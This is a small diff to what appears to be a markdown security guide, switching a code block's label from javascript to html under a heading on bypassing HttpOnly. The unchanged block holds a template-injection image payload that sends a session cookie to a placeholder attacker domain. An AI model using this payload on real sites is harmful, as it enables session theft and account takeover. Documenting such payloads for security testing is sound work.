@@ -18,6 +18,6 @@
 ### Client-side protections can be bypassed.
 
 - Bypassing HttpOnly and Exfiltrating Session Cookie Value
-    ```javascript
+    ```html
     <img src=https://[ATTACKER-DOMAIN]/?cookie={{request.cookies.session}}>
     ```
